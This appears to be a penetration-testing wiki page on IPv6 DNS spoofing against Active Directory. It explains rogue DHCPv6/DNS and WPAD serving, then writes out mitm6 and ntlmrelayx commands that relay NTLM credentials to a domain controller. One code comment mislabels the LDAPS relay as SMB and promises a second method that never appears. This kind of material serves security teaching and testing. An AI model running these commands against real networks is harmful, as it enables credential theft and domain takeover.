# IPv6 Attacks

## Brief

{% hint style="info" %}
### **What is IPv6 DNS Spoofing?** <a href="#bkmrk-what-is-ipv6-dns-spo" id="bkmrk-what-is-ipv6-dns-spo"></a>

An attacker announces itself as an IPv6 DHCP server and DNS server on the network, which tricks clients into sending requests to the attacker's machine.\


### **What's the Flaw?** <a href="#bkmrk-what-27s-the-flaw-3f" id="bkmrk-what-27s-the-flaw-3f"></a>

Many networks are still predominantly IPv4 networks and are not utilizing IPv6, but have not disabled IPv6 traffic in their network. Windows hosts communicate over both protocols, so if IPv6 traffic is allowed to flow on the network unchecked, an attacker can use this unmonitored/unmitigated space as an attack vector.



### **How is it Exploited?** <a href="#bkmrk-how-is-it-exploited-3f" id="bkmrk-how-is-it-exploited-3f"></a>

Assuming the target Active Directory network makes use of LDAPs (LDAP is also fine), the attack requires the use of two tools -- `mitm6` and `ntlmrelayx`. This attack works by announcing an IPv6 router and DNS server on the LAN segment. IPv6 clients will connect to the server and request a WPAD file.

The client will request a WPAD file via DNS to the spoofed DNS server and a legitimate WPAD file with malicious configurations will be served to the client. Now, when any client wants to connect over certain protocols like HTTP, it will attempt to authenticate to the WPAD proxy via NTLM; which can be relayed to target(s) of the attacker's choosing.

&#x20;

**This is especially dangerous** when relaying a privileged user's credential to the domain controller, as it may allow for the creation of new computer and user accounts on the domain, which **can be used for persistence**.
{% endhint %}

## Attack

First, we start mitm6, which will start replying to DHCPv6 requests and afterward to DNS queries requesting names in the internal network.

<pre class="language-bash"><code class="lang-bash"><strong># First Part : Only respond to DNS requests for domain.tld hosts
</strong><strong>mitm6 -d $domain
</strong>
# For the second part of our attack, we use  ntlmrelayx to relay the captured hashes. Now i will show two possible ways to use this tool, first through a simple SMB relay. 
ntlmrelayx.py -6 -t ldaps://$dcip -wh $wpadhostname.domain.tld -l $lootdir
</code></pre>

## More

{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" %}
